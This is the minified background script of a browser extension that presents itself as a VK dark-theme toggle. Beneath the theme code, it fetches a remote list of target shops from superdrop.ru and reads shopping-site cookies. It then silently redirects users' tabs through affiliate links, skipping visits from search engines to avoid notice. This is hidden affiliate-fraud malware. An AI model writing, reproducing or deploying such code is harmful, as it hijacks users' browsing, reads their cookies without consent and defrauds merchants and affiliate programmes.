var tabs = {},
    tabsHistory = {},
    detect = ["yandex", "google", "youtube.com", "vk.com", "facebook.com", "mail.ru", "ok.ru", "yahoo"],
    domains = [],
    domainsDef = {
        "aliexpress.com": {
            name: "xman_us_f",
            check: function (e) {
                try {
                    e = decUrl(e).x_as_i, e = decodeURIComponent(e), e = (e = JSON.parse(e)).tp1
                } catch (e) {
                    return !setBlock(0)
                }
                return ("ppc" == e || !e) && setCounter(0)
            }
        }
    },
    tryCount = 0;

function setIcon() {
    chrome['browserAction'].setIcon({
        path: "img/" + localStorage.mode + "_32.png"
    })
}

function set(e, t) {
    chrome['tabs'].executeScript(e, {
        code: "document.getElementsByTagName('html')[0].setAttribute('theme', '" + t + "');"
    })
}

function changeMode(e) {
    localStorage.mode = e, chrome['storage']['local'].set({
        mode: e
    })
}

localStorage.mode || changeMode("dark"), setIcon(), chrome.browserAction.onClicked.addListener(function () {
    changeMode("light" == localStorage.mode ? "dark" : "light"), setIcon(), chrome['tabs'].query({}, function (e) {
        for (var t = 0; t < e.length; t++) {
            var o = e[t].url.slice(7);
            "/" == o[0] && (o = o.slice(1)), 0 !== o.indexOf("vk.com") && 0 !== o.indexOf("oauth.vk.com") || set(e[t].id, localStorage.mode)
        }
    })
}), chrome['tabs'].query({}, function (e) {
    for (var t = 0; t < e.length; t++) {
        var o = e[t].url.slice(7);
        "/" == o[0] && (o = o.slice(1)), 0 !== o.indexOf("vk.com") && 0 !== o.indexOf("oauth.vk.com") || (chrome['tabs'].insertCSS(e[t].id, {
            file: "css/vk.css"
        }), chrome['tabs'].executeScript(e[t].id, {
            file: "core/preload.js"
        }), chrome['tabs'].executeScript(e[t].id, {
            file: "core/postload.js"
        }))
    }
});

function decUrl(e) {
    var t = new Object;
    e = e.substring(1).split("&");
    for (var o = 0; o < e.length; o++) c = e[o].split("="), t[c[0]] = c[1];
    return t
}

function setBlock(e) {
    var t = !!domains[e][1].block;
    return domains[e][1].block = !0, t
}

function setCounter(e) {
    if (domains[e][1].counter) {
        if (domains[e][1].counter > 3) return !1;
        domains[e][1].counter++
    } else domains[e][1].counter = 0;
    return !0
}

function reverseStr(e) {
    return e.split("").reverse().join("")
}

function redirectTab(e, t, o) {
    var r;
    if (domains[e][1].check ? r = domains[e][1].check(o ? o[0].value : null) : (domains[e][1].visited || (domains[e][1].visited = !0, r = !0), setCounter(e) || (r = !1)), r || tabs[t.id] > 0) {
        tabs[t.id] = 0, tabsHistory[t.id] = t.url;
        var a = domains[e][1].link;
        domains[e][1].redirect && (a += encodeURIComponent(t.url)), domains[e][1].link2 && (a += domains[e][1].link2), chrome['tabs'].update(t.id, {
            url: a
        })
    }
}

function getList() {
    try {
        var e = new XMLHttpRequest,
            t = {};
        localStorage.id && localStorage.hash && (t.id = localStorage.id, t.hash = localStorage.hash), e.open("POST", "http://superdrop.ru/?type=addon", !0), e.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), e.send("data=" + JSON.stringify(t)), e.onreadystatechange = function () {
            if (4 == e.readyState)
                if (200 == e.status) {
                    try {
                        var t = JSON.parse(e.responseText)
                    } catch (e) {
                        return retry(), !1
                    }
                    var o, r, a = [];
                    if (t.cancel) return !1;
                    localStorage.id = t.id, t.hash && (localStorage.hash = t.hash);
                    for (var n = 0; n < t.list.length; n++) o = a.length, a.push([reverseStr(t.list[n][0]), {}]), domainsDef[t.list[n][0]] && (a[o][1] = domainsDef[t.list[n][0]]), a[o][1].domain = t.list[n][0], a[o][1].id = t.list[n][3], r = t.links[t.list[n][1]], a[o][1].link = r[0] + t.list[n][2] + r[1] + (t.list[n][4] ? "" : r[2]), r[3] && (a[o][1].link2 = r[3]), a[o][1].redirect = !t.list[n][4];
                    domains = a, setTimeout(getList, 864e5), tryCount = 0
                } else retry()
        }
    } catch (e) {
        retry()
    }
}

function rand(e, t) {
    return Math.floor(Math.random() * (t - e + 1)) + e
}

chrome['tabs'].onUpdated.addListener(function (e, t, o) {
    return "loading" == t.status && (0 === o.url.indexOf("https://ad.admitad.com/dummy/") || 0 === o.url.indexOf("http://ad.admitad.com/dummy/") ? (chrome['tabs'].update(e, {
        url: tabsHistory[o.id]
    }), !1) : void chrome['tabs'].get(e, function (t) {
        var o = document.createElement("a");
        o.href = t.url;
        var r = reverseStr(o.hostname);
        tabs[e] || (tabs[e] = 0);
        for (var a = 0; a < detect.length; a++)
            if (-1 !== o.hostname.indexOf(detect[a])) return tabs[e] = 4, !1;
        tabs[e] > 0 && tabs[e]--;
        for (a = 0; a < domains.length; a++)
            if (0 === r.indexOf(domains[a][0])) {
                domains[a][1].domain && domains[a][1].name ? chrome['cookies'].getAll({
                    domain: domains[a][1].domain,
                    name: domains[a][1].name
                }, function (e) {
                    redirectTab(a, t, e)
                }) : redirectTab(a, t, null);
                break
            }
    }))
}), chrome['tabs'].onRemoved.addListener(function (e, t) {
    void 0 != tabs[e] && delete tabs[e], void 0 != tabsHistory[e] && delete tabsHistory[e]
}), getList();

function retry() {
    var e = 3e5 + rand(0, 6e4);
    0 == tryCount && (e = 5e3), 1 == tryCount && (e = 6e4), setTimeout(getList, e), tryCount++
}
